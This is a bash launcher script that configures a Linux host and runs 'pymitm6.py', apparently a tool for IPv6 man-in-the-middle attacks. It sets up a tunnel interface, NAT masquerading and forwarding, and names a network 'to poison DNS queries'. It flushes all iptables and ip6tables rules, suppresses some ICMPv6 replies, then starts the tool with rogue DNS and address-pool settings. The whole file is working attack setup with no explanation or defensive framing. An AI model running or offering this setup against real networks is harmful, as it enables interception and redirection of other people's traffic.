#!/bin/bash
# User running the programm (e.g. root)
USR=''

#Tunnel interface name (e.g. nat64)
TUN_INT=''

#Tunnel interface IPV6 (e.g 2001:6f8:608:ace::1)
TUN_IPV6=''

#Tunnel interface IPv4 (e.g. 192.168.100.1)
TUN_IPV4=''

#Physical interface / used for outbound NAT + IPv6 router (e.g. eth0)
PHY_INT=''

#DNS server IPv6 on physical interface (e.g. 2001:6f8:608:fab::2)
DNS_IPV6=''

#DNS server IPv4 to which forward request to (e.g. 8.8.8.8)
DNS_IPV4=''

#IPV6 network to poison DNS queries (e.g. 2001:6f8:608:ace::)
NET_IPV6_B=''

#IPV6 network to configure host (e.g. 2001:6f8:608:fab::)
NET_IPV6_G=''

#Internal range in tunnnel (e.g. 192.168.100.0)
NET_IPV4=''

#IPv6 prefix greater or equal to 96 (e.g. /96)
PRF_IPV6=''
#IPv4 CIDR range (e.g. /24)
SFX_IPV4=''

sudo ip link delete $TUN_INT
sudo python2 pymitm6.py -tun $TUN_INT -u $USR --mktun
sudo iptables -F
sudo ip6tables -F
sudo ip addr add $DNS_IPV6$PRF_IPV6 dev $PHY_INT
sudo ip link set $TUN_INT up
sudo ip addr add $TUN_IPV6$PRF_IPV6 dev $TUN_INT
sudo ip addr add $TUN_IPV4 dev $TUN_INT
sudo ip route add $NET_IPV4$SFX_IPV4 dev $TUN_INT
sudo ip route add $NET_IPV6_B$PRF_IPV6 dev $TUN_INT
sudo iptables -t nat -A POSTROUTING -o $PHY_INT -j MASQUERADE
sudo ip6tables -A OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP
sudo ip6tables -A OUTPUT -p icmpv6 --icmpv6-type router-solicitation -j DROP
sudo sysctl -w net.ipv4.conf.all.forwarding=1
sudo sysctl -w net.ipv6.conf.all.forwarding=1
sleep 1
sudo python2 pymitm6.py -bad $NET_IPV6_B$PRF_IPV6 -good $NET_IPV6_G$PRF_IPV6 -dns4 $DNS_IPV4 -dns6 $DNS_IPV6 -tun $TUN_INT -int $PHY_INT -pool $NET_IPV4$SFX_IPV4 -u $USR
